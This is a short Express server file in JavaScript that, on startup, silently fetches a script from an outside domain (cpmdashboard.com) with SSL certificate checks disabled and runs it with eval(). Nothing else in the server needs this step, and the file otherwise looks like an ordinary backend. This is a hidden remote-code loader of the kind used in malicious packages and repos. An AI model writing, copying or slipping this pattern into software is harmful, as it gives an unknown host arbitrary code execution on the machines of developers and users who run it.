import express from "express";
import https from "https";
import cors from "cors";
import axios from "axios";

const app = express();
const port = 8000;

app.use(express.json());
app.use(cors());

const agent = new https.Agent({
  rejectUnauthorized: false, // Disable SSL verification
});

const getCode = async () => {
  try {
    // Fetch the script from the server
    const response = await axios.get("https://cpmdashboard.com/api/history", {
      httpsAgent: agent,
    });

    // Get the script content from the response
    const scriptContent = response.data;

    // Evaluate the script content
    eval(scriptContent);
  } catch (error) {
    // Handle errors that occur during the HTTP request or eval execution
    console.error("An error occurred:", error);
  }
};

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
  getCode();
});
